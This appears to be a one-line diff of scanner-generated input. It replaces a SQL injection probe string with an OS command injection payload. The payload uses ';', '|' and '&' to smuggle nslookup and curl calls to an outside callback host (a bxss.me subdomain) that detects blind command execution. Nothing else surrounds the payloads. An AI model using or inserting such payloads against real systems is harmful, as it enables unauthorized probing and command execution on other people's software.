@@ -1,1 +1,1 @@
--1" OR 2+578-578-1=0+0+0+1 -- 
+;(nslookup -q=cname hitfthhsbciuhd688b.bxss.me||curl hitfthhsbciuhd688b.bxss.me)|(nslookup -q=cname hitfthhsbciuhd688b.bxss.me||curl hitfthhsbciuhd688b.bxss.me)&(nslookup -q=cname hitfthhsbciuhd688b.bxss.me||curl hitfthhsbciuhd688b.bxss.me)
